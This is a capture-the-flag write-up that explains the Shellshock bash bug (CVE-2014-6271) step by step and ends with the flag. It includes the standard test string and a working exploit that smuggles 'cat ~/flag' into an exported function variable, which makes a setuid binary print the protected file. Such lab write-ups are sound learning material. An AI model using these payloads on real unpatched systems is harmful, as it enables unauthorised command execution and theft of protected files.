- OK seems like in this one I need to run the shellshock vulnrability, i will read about it
- I ran /bin/bash --version - got:
GNU bash, version 4.3.48(1)-release (x86_64-pc-linux-gnu)
- I ran ~/bash --version (the one the binary runs) and got:
GNU bash, version 4.2.25(1)-release (x86_64-pc-linux-gnu)
- Seems like  bash version prior to 4.1.2 is vulnrable for sure
- Running this line to check:
env x='() { :;}; echo vulnerable' bash -c "echo If you see the word vulnerable above, you are vulnerable to shellshock"
- The output was not vulnerable
- Now let's try the bash inside the home directory
env x='() { :;}; echo vulnerable' ~/bash -c "echo If you see the word vulnerable above, you are vulnerable to shellshock"
- This was indeed vulnrable!
- A little bit about the vulnrability (from https://techglimpse.com/fix-bash-shell-update-script-shellshock-fix/)
- In bash of course we can use env variables x=1, then echo $x.
- If we will open a new bash withing the current bash and try to echo $x, we won't see it any more - the variable is only in the scope of the bash it was created in
- What we can do, is use the export command, x=1, export -n x - then if we create a new bash x will be avaliable
- The following also works with bash functions like: fnc() { echo "testing"; } then export -f fnc
- The shellshock vulnrability is actually a bug in bash, where when a new bash is spawned, bash is executing the code - in order to define the function!
- So in a normal case it will execute the following code:
fnc() { echo "testing"; }
- So now fnc, is defined. BUT! on the vulnrable bash versions - bash DOES NOT stop executing the code after the closing brackets "}" - so what we can do is export the following variable:
fnc() { echo "testing"; }; echo "test";
- So the full command will look like this:
export fnc='() { echo "testing"; }; echo "test";'
- Then, when I will run a bash again whithin my shell - test will be printed!
- Ran in it on the server - worked well :)
- export fnc='() { echo "testing"; }; ./shellshock;'
- Now running ~/bash - will print shock_me - This is not what I need to do, the ./shellshock binary runs bash -c, and is setting his sid and gid so it will be able to access the flag flie
- So let's run the following:
- export fnc='() { echo "testing"; }; cat ~/flag;'
- Then let's run ./shellshock
- Nice! got the following output:
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault (core dumped)

# FLAG: only if I knew CVE-2014-6271 ten years ago..!!
# pwned.


 